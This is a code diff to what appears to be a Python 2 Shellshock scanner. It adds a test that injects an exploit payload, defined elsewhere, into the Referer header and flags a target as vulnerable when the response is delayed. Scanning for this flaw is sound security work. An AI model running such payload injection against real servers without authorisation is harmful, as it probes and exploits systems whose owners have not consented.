@@ -48,10 +48,35 @@ def testBashShock2(url):
 	req = urllib2.Request(url)
 	req.add_header('Proxy-Connection', 'keep-alive')
 	req.add_header('Cache-Control', 'max-age=0')
-	req.add_header('X-Test', EXPLOIT2)
-	req.add_header('User-Agent', EXPLOIT2)
-	req.add_header('Referer',  EXPLOIT2)
+	#req.add_header('X-Test', EXPLOIT2)
+	#req.add_header('User-Agent', EXPLOIT2)
+	#req.add_header('Referer',  EXPLOIT2)
 	req.add_header('X-Forwarded-For',  EXPLOIT2)
+	#print '******* ' + url + ' *******'
+	try:
+		t1 = time.time()
+		response = opener.open(req, timeout = 30)
+		t2 = time.time() - t1
+		if t2 >= 12 and t2 < 30:
+			print
+			print 'PANIC!!!'
+			print '******* ' + url
+			print
+			return True
+	except Exception, e:
+	   print 'Exception: ', e
+	return False
+
+def testBashShock3(url):
+	opener = urllib2.build_opener()
+	webutils.setupOpener(opener)
+	req = urllib2.Request(url)
+	req.add_header('Proxy-Connection', 'keep-alive')
+	req.add_header('Cache-Control', 'max-age=0')
+	#req.add_header('X-Test', EXPLOIT2)
+	#req.add_header('User-Agent', EXPLOIT2)
+	req.add_header('Referer',  EXPLOIT2)
+	#req.add_header('X-Forwarded-For',  EXPLOIT2)
 	#print '******* ' + url + ' *******'
 	try:
 		t1 = time.time()
@@ -70,6 +95,7 @@ def testBashShock2(url):
 def scan(url, opener):
 	testBashShock1(url)
 	testBashShock2(url)
+	testBashShock3(url)
 
 if __name__ == '__main__':
 	opts, args = getopt.getopt(sys.argv[1:], "n:b:w:u:")
